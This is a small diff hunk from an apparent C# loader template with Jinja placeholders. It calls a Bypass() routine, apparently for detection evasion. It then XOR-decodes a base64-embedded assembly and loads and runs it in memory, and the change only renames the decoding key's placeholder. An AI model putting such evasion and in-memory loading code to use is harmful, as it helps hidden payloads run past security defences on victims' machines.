@@ -89,7 +89,7 @@
               Console.SetOut(stdout);
               stdout.WriteLine(Bypass());
               SetProcessDPIAware();
-              asmb = Assembly.Load(Zor(Convert.FromBase64String("{{ csharp_bin | safe }}"), Encoding.UTF8.GetBytes("{{ random_string }}")));
+              asmb = Assembly.Load(Zor(Convert.FromBase64String("{{ csharp_bin | safe }}"), Encoding.UTF8.GetBytes("{{ encrypted_string }}")));
               stdout.WriteLine("[*] Running assembly with arguments: " + string.Join(" ", args));
               asmb.EntryPoint.Invoke(null, new object[] {
                 args
